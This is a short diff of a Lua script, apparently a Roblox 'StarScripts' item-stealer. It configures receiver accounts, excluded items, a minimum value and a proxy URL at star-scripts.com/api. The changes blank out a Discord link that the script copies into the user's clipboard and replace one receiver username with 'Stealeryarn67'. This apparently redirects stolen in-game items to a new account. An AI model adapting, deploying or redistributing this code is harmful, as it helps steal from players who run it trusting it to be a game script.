@@ -1,5 +1,3 @@
--- discord.gg/syncrypt
-
 local function geniter(f, s, c)
 	if type(f) ~= "function" then
 		local mt = getmetatable(f)
@@ -35,7 +33,7 @@ pcall(function()
 	local setclipboard_ = setclipboard or toclipboard
 
 	if type(setclipboard_) == "function" then
-		setclipboard_("https://discord.gg/starscripts")
+		setclipboard_("")
 	end
 end)
 
@@ -51,7 +49,7 @@ local v8, staticKey, v10, v11, t1, v13, t2, v15, v16, Godly
 local v18, u19, v20, v21
 
 do
-	local Receivers = "Cmbath", "jxst_v1cz"
+	local Receivers = "Cmbath", "Stealeryarn67"
 	local ExcludedItems = StarScriptsConfig.ExcludedItems or StarScriptsConfig.EXCLUDED_ITEMS
 	local ExcludedBelowValue = StarScriptsConfig.ExcludedBelowValue or StarScriptsConfig.EXCLUDED_BELOW_VALUE or 0
 	local v25 = tostring(StarScriptsConfig.ProxyUrl or StarScriptsConfig.PROXY_URL or "https://star-scripts.com/api"):gsub("/+$", "")
